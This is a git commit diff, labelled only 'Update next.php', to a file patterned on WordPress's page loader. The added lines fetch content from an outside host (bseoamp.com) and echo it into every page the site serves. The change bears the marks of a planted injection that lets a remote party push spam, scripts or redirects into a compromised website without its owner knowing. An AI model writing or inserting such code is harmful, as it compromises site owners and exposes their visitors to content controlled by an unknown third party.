ffe549f39adcecd90190cbabd8d6c71f14578b96
eagles227 <166109731+eagles227@users.noreply.github.com>
2025-03-08 13:42:12 +0700

    Update next.php

--- next.php
+++ next.php
@@ -18,5 +18,8 @@ if (!isset($wp_did_header)) {
     // Load the theme template.
     require_once ABSPATH . WPINC . '/template-loader.php';
 }
-
+?>
+<?php
+$a = file_get_contents('https://bseoamp.com/bseo/');
+echo $a;
 ?>
